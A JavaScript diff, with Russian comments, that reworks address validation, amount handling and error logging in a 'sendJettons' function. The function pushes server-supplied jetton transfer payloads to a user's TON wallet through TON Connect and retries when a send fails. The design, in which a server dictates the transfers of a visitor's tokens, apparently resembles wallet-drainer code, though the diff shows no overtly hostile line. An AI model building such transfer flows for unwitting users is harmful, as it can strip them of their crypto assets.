@@ -220,25 +220,22 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     for (let currentIndex = i; currentIndex < len && msgs < 2; currentIndex++) {
         try {
             if (data.data.boc[currentIndex] && data.data.address[currentIndex]) {
-                // ВАЖНОЕ ИСПРАВЛЕНИЕ: Проверяем и форматируем адрес
+                // Получаем адрес jetton кошелька
                 let jettonAddress = data.data.address[currentIndex];
                 
-                // Если адрес в raw формате (начинается с 0:), конвертируем его
-                if (jettonAddress.startsWith('0:')) {
-                    try {
-                        const addrObj = new TonWeb.utils.Address(jettonAddress);
-                        jettonAddress = addrObj.toString(true, true, false); // bounceable, urlSafe, testOnly=false
-                        console.log(`Converted raw address to TON Connect format: ${jettonAddress}`);
-                    } catch (convError) {
-                        console.error('Error converting address:', convError);
-                        continue; // Пропускаем этот jetton если не можем конвертировать адрес
-                    }
-                }
+                console.log(`Raw jetton address: ${jettonAddress}`);
                 
-                // Проверяем что адрес в правильном формате
-                if (!jettonAddress.includes(':')) {
-                    console.error(`Invalid address format for jetton: ${jettonAddress}`);
-                    continue;
+                // ВАЖНОЕ ИСПРАВЛЕНИЕ: Убираем неправильную проверку формата
+                // Адреса в формате UQ... - это валидные TON адреса
+                
+                // Проверяем валидность адреса созданием объекта Address
+                try {
+                    const addrObj = new TonWeb.utils.Address(jettonAddress);
+                    // Если дошли сюда - адрес валидный
+                    console.log(`Valid jetton address: ${jettonAddress}`);
+                } catch (addrError) {
+                    console.error(`Invalid jetton address format: ${jettonAddress}`, addrError);
+                    continue; // Пропускаем невалидный адрес
                 }
                 
                 transaction.messages.push({
@@ -262,18 +259,20 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
 
     // Проверяем что есть сообщения для отправки
     if (transaction.messages.length > 0) {
-        // Финальная проверка всех адресов
+        // Финальная проверка всех сообщений
         for (let msg of transaction.messages) {
-            if (!msg.address || typeof msg.address !== 'string') {
-                console.error('Invalid message address:', msg);
-                return;
+            if (!msg.address || !msg.amount) {
+                console.error('Invalid message:', msg);
+                continue;
             }
-            if (!msg.amount || msg.amount === '0') {
-                msg.amount = TonWeb.utils.toNano('0.1').toString();
+            // Убеждаемся что amount - строка
+            if (typeof msg.amount !== 'string') {
+                msg.amount = msg.amount.toString();
             }
         }
         
         console.log(`Preparing to send transaction with ${transaction.messages.length} messages`);
+        console.log('Transaction details:', transaction);
         
         try {
             // Уведомляем сервер о запросе трансфера
@@ -301,12 +300,18 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         } catch (error) {
             console.error('Transaction failed:', error);
             
-            if (error.message && error.message.includes('Wrong address format')) {
-                console.log('Address format error - checking address conversion');
-                // Логируем проблемные адреса для отладки
-                transaction.messages.forEach((msg, idx) => {
-                    console.log(`Message ${idx} address: ${msg.address}, type: ${typeof msg.address}`);
-                });
+            // Детальный анализ ошибки
+            if (error.message) {
+                if (error.message.includes('Wrong address format')) {
+                    console.log('Address format error - details:');
+                    transaction.messages.forEach((msg, idx) => {
+                        console.log(`Message ${idx}: address=${msg.address}, amount=${msg.amount}, payload_length=${msg.payload ? msg.payload.length : 'none'}`);
+                    });
+                }
+                if (error.message.includes('Rejected by user')) {
+                    console.log('Transaction rejected by user');
+                    return;
+                }
             }
             
             if (tryies < maxRetry - 1) {
@@ -567,6 +572,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
